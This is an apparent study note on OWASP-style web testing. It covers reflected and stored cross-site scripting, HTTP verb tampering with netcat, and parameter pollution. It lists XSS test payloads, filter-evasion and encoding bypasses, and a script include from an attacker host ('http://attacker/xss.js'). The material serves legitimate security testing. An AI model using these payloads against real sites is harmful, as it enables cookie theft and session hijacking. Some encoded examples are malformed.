# Input Validation Testing
## Testing for Reflected Cross Site Scripting
It is not persistent and only impacts users who open a maliciously crafted link. Unvalidated input is sent through requests back to the client. Attacker creates and tests an offending URI (social engineering). Attacker's code is usually in Javascript. Commot attacks install key loggers, steal victim cookies, steal clipboard content, change page content etc.

In some cases, the web server cannot filter some encodings of characters :
eg. `"<script>"` can be filtered, but `"%3cscript%3e"` cannot.

### Tests
1. Detect input vectors - all user defined values and their input has to be determined. Some common hidden, non obvious inputs  are :
   - HTTP parameters
   - POST data
   - hidden form field values
   - predefined radio or selection values
2. Analyze each input vector to detect potential vulnerabilities. Use scpecial crafted input data with each vector. Test data can be generated by a web application fuzzer or a list of knwon attack strings or manually (polyglots).   
   - `<script>alert(document.cookie)</script>`
   - `"><script>alert(document.cookie)</script>`
For more check __XSS Filter Evasion Cheat Sheet__
3. For each test input analyze the result and determine if it represents a vulnerability. If a vulnerability is found, tester identifies any special characters that were not properly filtered.

Examples :
1. check GET parameters - `http://...../index.php?user=<script>alert(document.cookie)</script>`
2. check GET parameters - `http://...../index.php?user=<script>window.onload=function(){alert(document.cookie)}</script>`
3. The user can use input value to fill an attribute - `<input type="text" value="INPUT_FROM_USER">` and then the tester submit `“ onfocus=”alert(document.cookie)`
4. Different syntax or encoding - Insert unexpected variations in the syntax or encoding
   - `"><script>.........</script>`
   - `%3cscript%e alert(document.cookie) %3c/script%3e`
5. Bypassing non recursive filtering - Often input sanitization is _applied only once_
   - `<scr<script>ipt> alert(document.cookie) </script>`
6. Including external script - Assume that there is a regular expression checking if "<script*" (_anything but >_) is inserted. eg `<script src="http://....../xss.js"></script>` - bypass this by using the ">" character in an attribute between _script_ and _src_
   - `http://example/?var=<SCRIPT%20a=”>”%20SRC=”http://attacker/xss.js”></SCRIPT>`
7. HTTP Parameter Pollution - Splitting the attack vector between multiple parameters that have the same name
   - regular attack - `http://example/page.php?param=<script>...</script>`
   - using HPP - `http://example/page.php?param=<script&param=>...</&param=script>`

### Tools
- OWASP CAL9000
- PHP Charset encoder
- HackVector
- XSS_Proxy
- Ratproxy
- Burp
- OWASP Zed Attack Proxy
- OWASP Xenotic XSS Expoloit Framework

## Testing for Stored Cross Site Scripting
When malicious inout is stored for late use. This malicious code will appear as of the website and run within the user's browser under the privileges of the web app. It includes at least two requests to the application and is also called second-order XSS.

Stored XSS does not need a malicious link to be exploited. A typical scenario has the following phases :
- attacker stores malicious code into the vulnerable page
- user authenticates in the platform
- user visits vulnerable page
- malicious code is executed by the user's browser

### Tests
- Identify all points where user input is stored into the backend and then displayed by the application. For example
  - user profile
  - shopping cart
  - application file manager (if file upload is allowed)
  - application settings/ preferences
  - forum/message board
  - blog (comments)
  - log (if it stores some user input into logs)
- Determine if input is stored and how it is positioned in the context of the page (html tag for javascript)
- All the out-of-band channels through which the application receives and stores user input

Examples :
`<input class=..... type="text" name="email" value="aaa@aaa.bb"/>`
The tester needs to find a way to inject code outside the input tag
`<...>malicious code<!--  /> `

eg
`aaa@aaa.bb"><script>alert(document.cookie)</script>`

If "script" is replaced by space or null then the tester should examine the app for *XSS filtering*
Stored XSS can be exploited by advanced Javascript exploitation framerwords (BeEF, XSS Proxy, BackFrame)

### File upload
Check if the web app allows file upload with html or text content. Text files, jpg and gif can contain XSS payload
#### Image file contents
mpla mpla mpla <script>alert(document.cookie)</script>

### Tools
- OWASP CAL9000
- PHP Charset Encoding (PCE)
- HackVector
- BeEF
- XSS-Proxy
- BackFrame
- XSS Assistant
- Burp Suite
- XSS Filter Evasion Cheat Sheet

## Testing for HTTP Verb Tampering
HTTP specifications includes request methods other than the standard GET and POST, Many servers may respond to these alternative methods with not anticipated results.
Valid HTTP request methods are:
- OPTIONS
- GET
- HEAD
- POST
- PUT
- DELETE
- TRACE
- CONNECT
WebDAV extensions also permit
- PROPFIND
- PROPMATCH
- MKCOL
- COPY
- MOVE
- LOCK
- UNLOCK

Standard *href* links trigget a GET request. Form data (with method='POST' trigger
POST requests). Forms without method trigger GET requests.
HTML standard **DOES NOT** support other methods. All other methods need to be called outside
the html document. Javascript and AJAX allow other methods.

### Tests
Craft custom HTTP requests - preferably use a tool

### Manual HTTP verb tampering Testing
Use netcat package (or telnet)
1. Crafting custom HTTP requests. Each HTTP 1.1 request follows basic formatting and syntax. Type each request into *netcat* or *telnet* and examine the response.
  ```
  [METHOD]/[index.html]HTTP/1.1
  host:[www.example.com]
  ```
  where  METHOD can use OPTIONS, GET, HEAD, POST, PUT, DELETE, TRACE or CONNECT
2. Send the request (`nc host 80 < OPTIONS.http.txt`)
3. Parse HTTP responses. Except GET and POST, server must **either ignore the request or return error**. Any other method should be disabled

## Testing for HTTP Parameter Pollution (HPP)
Supplying multiple params with the same name may confuse the application. Anomalous behaviour can lead to a potential exploit.
- Input validation and filters bypass
- Authentication bypass
- Expected behaviour by Application server

*HTTP parameters assignment is being handled by the web server and not the web application. So, testing HPP requires manual testing.*
**HPP can manifest itself in client side and server side components.**
